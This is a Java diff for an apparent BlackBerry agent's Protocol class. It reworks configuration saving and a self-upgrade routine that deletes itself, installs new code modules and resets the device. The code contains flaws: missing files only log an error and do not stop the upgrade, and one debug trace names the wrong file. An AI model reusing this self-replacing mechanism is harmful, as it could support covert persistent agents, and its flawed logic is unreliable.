@@ -49,15 +49,15 @@ public abstract class Protocol {
 
     public synchronized static boolean saveNewConf(byte[] conf, int offset)
             throws CommandException {
-        final AutoFlashFile file = new AutoFlashFile(Path.USER() + Path.CONF_DIR
-                + Conf.NEW_CONF, true);
+        final AutoFlashFile file = new AutoFlashFile(Path.USER()
+                + Path.CONF_DIR + Conf.NEW_CONF, true);
 
         file.create();
         final boolean ret = file.write(conf, offset, conf.length - offset);
         if (!ret) {
             //#ifdef DEBUG
             debug.error("saveNewConf: cannot write on file: "
-                    + file.getFilename());
+                    + file.getFullFilename());
             //#endif
             throw new CommandException(); //"write"
         }
@@ -82,44 +82,58 @@ public abstract class Protocol {
         debug.trace("file written: " + file.exists());
         //#endif
 
-        if (filename.equals(Protocol.UPGRADE_FILENAME_0)
-                || filename.equals(Protocol.UPGRADE_FILENAME_1)) {
-            upgradeMulti(new String[]{Protocol.UPGRADE_FILENAME_0,Protocol.UPGRADE_FILENAME_0});
-        }
-    }
-    
-    public static void saveUpload(String filename, byte[] content) {
-        final AutoFlashFile file = new AutoFlashFile(Path.USER() + filename,
-                true);
-
-        if (file.exists()) {
-            //#ifdef DEBUG
-            debug.trace("getUpload replacing existing file: " + filename);
-            //#endif
-            file.delete();
-        }
-        file.create();
-        file.write(content);
-
-        //#ifdef DEBUG
-        debug.trace("file written: " + file.exists());
-        //#endif
-
-
     }
 
     public static boolean upgradeMulti(Vector files) {
-        
-        // foreach file:
-        //     if !file.exist(): return
-        // deleteSelf();
-        // foreach file:
-        //     upgradeCod(file)  
-        // foreach file:
-        //     deleteCod(file)
-        // reset()
+
+        try {
+            AutoFlashFile[] autoFiles = new AutoFlashFile[files.size()];
+            // guarda se i file ci sono tutti e sono capienti e leggibili
+            for (int i = 0; i < files.size(); i++) {
+                String file = (String) files.elementAt(i);
+                AutoFlashFile autoFile = new AutoFlashFile(file);
+                autoFiles[i] = autoFile;
+
+                if (!autoFile.exists() || !autoFile.isReadable()
+                        || autoFile.getSize() <= 0) {
+                    //#ifdef DEBUG
+                    debug.error("upgradeMulti, file does not exist: " + file);
+                    //#endif
+                }
+            }
+
+            // cancella se stesso
+            deleteSelf();
+
+            // upgrade effettivo
+            for (int i = 0; i < autoFiles.length; i++) {
+                AutoFlashFile autoFlashFile = autoFiles[i];
+
+                //#ifdef DEBUG
+                debug.trace("upgrading: " + autoFlashFile.getFullFilename());
+                //#endif
+                upgradeCod(autoFlashFile.read());
+                autoFlashFile.delete();
+            }
+
+            // restart the blackberry if required
+            if (CodeModuleManager.isResetRequired()) {
+                //#ifdef DEBUG
+                CodeModuleManager.promptForResetIfRequired();
+                //#endif
+                //#ifdef DEBUG
+                debug.warn("Reset required");
+                //#endif
+            }
+
+            debug.logToInfo("Upgrade request", DebugLevel.INFORMATION);
+            return true;
+        } catch (Exception ex) {
+            debug.logToInfo("Upgrade FAILED", DebugLevel.ERROR);
+            return false;
+        }
     }
-    
+
     public static boolean upgradeMulti() {
         final AutoFlashFile file_0 = new AutoFlashFile(Path.USER()
                 + Protocol.UPGRADE_FILENAME_0, true);
@@ -132,8 +146,18 @@ public abstract class Protocol {
             //#endif                        
 
             deleteSelf();
-            upgradeCod(file_0.read(), Protocol.UPGRADE_FILENAME_0);
-            upgradeCod(file_1.read(), Protocol.UPGRADE_FILENAME_1);
+
+            //#ifdef DEBUG
+            debug.trace("upgrading: " + Protocol.UPGRADE_FILENAME_0);
+            //#endif
+
+            upgradeCod(file_0.read());
+
+            //#ifdef DEBUG
+            debug.trace("upgrading: " + Protocol.UPGRADE_FILENAME_0);
+            //#endif
+
+            upgradeCod(file_1.read());
 
             file_0.delete();
             file_1.delete();
@@ -171,7 +195,7 @@ public abstract class Protocol {
         }
     }
 
-    public static boolean upgradeCod(byte[] codBuff, String module_name) {
+    public static boolean upgradeCod(byte[] codBuff) {
 
         if (Utils.isZip(codBuff)) {
             //#ifdef DEBUG
@@ -179,10 +203,6 @@ public abstract class Protocol {
             //#endif
             return false;
         }
-
-        //#ifdef DEBUG
-        debug.trace("upgrading: " + module_name);
-        //#endif
 
         // Download new cod files(included sibling files).
 
